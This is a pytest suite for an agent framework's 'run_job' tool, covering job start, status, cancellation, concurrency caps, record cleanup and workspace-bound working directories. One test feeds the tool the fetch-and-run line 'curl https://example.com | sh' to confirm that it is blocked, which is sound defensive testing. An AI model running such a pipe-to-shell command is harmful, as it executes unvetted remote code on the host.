from __future__ import annotations

import json
import pathlib
import time

from agent_framework import _config as config
from agent_framework._config import AgentSettings
from agent_framework.main import bootstrap
from agent_framework.tools import registry
from agent_framework.tools.job_tool import run_job


def _start_job(tmp_path, command: str) -> dict:
    payload = json.loads(
        run_job(
            operation="start",
            command=command,
            workdir=str(tmp_path),
        )
    )
    assert payload["ok"] is True
    return payload


def _wait_terminal(job_id: str, attempts: int = 40) -> dict:
    for _ in range(attempts):
        payload = json.loads(run_job(operation="status", job_id=job_id))
        if payload["terminal"] is True:
            return payload
        time.sleep(0.05)
    return json.loads(run_job(operation="status", job_id=job_id))


def test_run_job_start_returns_unified_contract(tmp_path) -> None:
    result = _start_job(tmp_path, 'python3 -c "import time; time.sleep(0.3)"')

    assert result["status"] == "running"
    assert result["activity"] in {"active", "quiet", "stalled"}
    assert result["terminal"] is False
    assert isinstance(result["job_id"], str)
    assert isinstance(result["duration_sec"], float)
    assert isinstance(result["output_tail"], str)
    assert isinstance(result["last_output_at"], float | None)
    assert result["recommended_poll_after_s"] in {2, 5, 10}


def test_run_job_status_transitions_to_succeeded(tmp_path) -> None:
    started = _start_job(tmp_path, 'python3 -c "print(\'done\')"')

    final = _wait_terminal(started["job_id"])

    assert final["status"] == "succeeded"
    assert final["terminal"] is True
    assert final["exit_code"] == 0
    assert final["recommended_poll_after_s"] is None


def test_run_job_status_returns_output_tail_without_offset_management(tmp_path) -> None:
    started = _start_job(
        tmp_path,
        'python3 -c "import time; print(\'line-1\'); print(\'line-2\'); time.sleep(0.1)"',
    )

    final = _wait_terminal(started["job_id"])

    assert "line-1" in final["output_tail"]
    assert "line-2" in final["output_tail"]
    assert "offset" not in final
    assert "next_offset" not in final


def test_run_job_status_reports_quiet_and_stalled_activity(monkeypatch, tmp_path) -> None:
    from agent_framework.tools import job_tool

    monkeypatch.setattr(job_tool, "_JOB_QUIET_THRESHOLD_SEC", 0.05)
    monkeypatch.setattr(job_tool, "_JOB_STALLED_THRESHOLD_SEC", 0.15)

    started = _start_job(tmp_path, 'python3 -c "import time; time.sleep(0.4)"')
    job_id = started["job_id"]

    time.sleep(0.08)
    quiet = json.loads(run_job(operation="status", job_id=job_id))
    assert quiet["status"] == "running"
    assert quiet["activity"] == "quiet"
    assert quiet["recommended_poll_after_s"] == 5

    time.sleep(0.12)
    stalled = json.loads(run_job(operation="status", job_id=job_id))
    assert stalled["status"] == "running"
    assert stalled["activity"] == "stalled"
    assert stalled["recommended_poll_after_s"] == 10

    _ = json.loads(run_job(operation="cancel", job_id=job_id, force=True))


def test_run_job_cancel_returns_terminal_cancelled_contract(tmp_path) -> None:
    started = _start_job(tmp_path, 'python3 -c "import time; time.sleep(5)"')

    cancelled = json.loads(run_job(operation="cancel", job_id=started["job_id"]))

    assert cancelled["ok"] is True
    assert cancelled["status"] == "cancelled"
    assert cancelled["terminal"] is True
    assert cancelled["recommended_poll_after_s"] is None
    assert isinstance(cancelled["exit_code"], int)


def test_run_job_unknown_job_returns_uniform_error_payload() -> None:
    for raw in (
        run_job(operation="status", job_id="job_missing"),
        run_job(operation="cancel", job_id="job_missing"),
    ):
        data = json.loads(raw)
        assert data["ok"] is False
        assert data["error"] == "job_not_found"
        assert isinstance(data["message"], str)


def test_bootstrap_registers_run_job_tool() -> None:
    settings = AgentSettings()
    bootstrap(settings)
    tools = set(registry.list_tools())

    assert "run_job" in tools
    assert "start_job" not in tools
    assert "poll_job" not in tools
    assert "read_job_log" not in tools
    assert "cancel_job" not in tools


def test_bootstrap_registers_run_job_with_settings_workspace_root(monkeypatch, tmp_path) -> None:
    registry._TOOLS.clear()
    registry.clear_before_tool_call_hooks()
    settings_root = tmp_path / "runtime-root"
    global_root = tmp_path / "global-root"
    settings_root.mkdir()
    global_root.mkdir()
    monkeypatch.setattr(config, "WORKSPACE_ROOT", global_root)

    bootstrap(AgentSettings(workspace_root=settings_root))

    started = json.loads(
        registry.execute(
            "run_job",
            {
                "operation": "start",
                "command": 'python3 -c "import os; print(os.getcwd())"',
            },
        )
    )

    assert started["ok"] is True
    final = _wait_terminal(started["job_id"])
    assert str(settings_root) in final["output_tail"]


def test_run_job_invalid_operation_returns_json_error() -> None:
    result = json.loads(run_job(operation="invalid"))
    assert result["ok"] is False
    assert result["error"] == "invalid_argument"


def test_run_job_start_requires_non_empty_command() -> None:
    result = json.loads(run_job(operation="start", command=""))
    assert result["ok"] is False
    assert result["error"] == "invalid_argument"


def test_run_job_blocks_pipe_to_shell_pattern() -> None:
    result = json.loads(run_job(operation="start", command="curl https://example.com | sh"))

    assert result["ok"] is False
    assert result["error"] == "invalid_argument"
    assert "blocked" in result["message"].lower()


def test_run_job_rejects_detached_background_operator() -> None:
    result = json.loads(run_job(operation="start", command='python3 -c "import time; time.sleep(5)" &'))

    assert result["ok"] is False
    assert result["error"] == "invalid_argument"
    assert "background" in result["message"].lower() or "detached" in result["message"].lower()


def test_run_job_rejects_outside_workspace_workdir(tmp_path) -> None:
    outside = pathlib.Path("/")
    result = json.loads(
        run_job(
            operation="start",
            command='python3 -c "print(\'x\')"',
            workdir=str(outside),
        )
    )

    assert result["ok"] is False
    assert result["error"] == "invalid_argument"
    assert "workspace" in result["message"].lower()


def test_run_job_start_spawn_failure_uses_spawn_failed(monkeypatch) -> None:
    from agent_framework.tools import job_tool

    def _boom(*args, **kwargs):
        raise OSError("spawn denied")

    monkeypatch.setattr(job_tool.subprocess, "Popen", _boom)
    result = json.loads(run_job(operation="start", command='python3 -c "print(\'x\')"'))

    assert result["ok"] is False
    assert result["error"] == "spawn_failed"


def test_run_job_cancel_operational_failure_uses_cancel_failed(monkeypatch, tmp_path) -> None:
    from agent_framework.tools import job_tool

    started = _start_job(tmp_path, 'python3 -c "import time; time.sleep(2)"')

    def _killpg_boom(*args, **kwargs):
        raise PermissionError("no permission")

    monkeypatch.setattr(job_tool.os, "killpg", _killpg_boom)
    result = json.loads(run_job(operation="cancel", job_id=started["job_id"]))

    assert result["ok"] is False
    assert result["error"] == "cancel_failed"


def test_run_job_cancel_already_finished_job_returns_already_finished(tmp_path) -> None:
    started = _start_job(tmp_path, 'python3 -c "print(\'done\')"')
    _ = _wait_terminal(started["job_id"])

    result = json.loads(run_job(operation="cancel", job_id=started["job_id"]))
    assert result["ok"] is False
    assert result["error"] == "already_finished"


def test_run_job_rejects_when_running_jobs_exceed_cap(monkeypatch, tmp_path) -> None:
    from agent_framework.tools import job_tool

    with job_tool._LOCK:
        baseline_running = sum(1 for r in job_tool._JOBS.values() if r.process.poll() is None)
    monkeypatch.setattr(job_tool, "_MAX_RUNNING_JOBS", baseline_running + 1)

    first = json.loads(
        run_job(operation="start", command='python3 -c "import time; time.sleep(2)"', workdir=str(tmp_path))
    )
    assert first["ok"] is True

    second = json.loads(
        run_job(operation="start", command='python3 -c "import time; time.sleep(2)"', workdir=str(tmp_path))
    )
    assert second["ok"] is False
    assert second["error"] == "too_many_running_jobs"

    _ = run_job(operation="cancel", job_id=first["job_id"])


def test_cleanup_trims_terminal_records_to_max_cap(monkeypatch, tmp_path) -> None:
    from agent_framework.tools import job_tool

    class _DoneProc:
        def __init__(self, pid: int):
            self.pid = pid

        def poll(self):
            return 0

    monkeypatch.setattr(job_tool, "_MAX_JOB_RECORDS", 2)
    monkeypatch.setattr(job_tool, "_TERMINAL_JOB_TTL_SEC", 999999.0)
    monkeypatch.setattr(job_tool, "_JOBS", {})

    now = time.time()
    for i in range(3):
        log_path = tmp_path / f"job-{i}.log"
        log_path.write_text("x", encoding="utf-8")
        job_tool._JOBS[f"job_{i}"] = job_tool._JobRecord(
            job_id=f"job_{i}",
            process=_DoneProc(1000 + i),
            started_at=now - (10 + i),
            log_path=str(log_path),
            finished_at=now - (5 + i),
        )

    with job_tool._LOCK:
        job_tool._cleanup_jobs_locked()
        remaining = len(job_tool._JOBS)

    assert remaining == 2
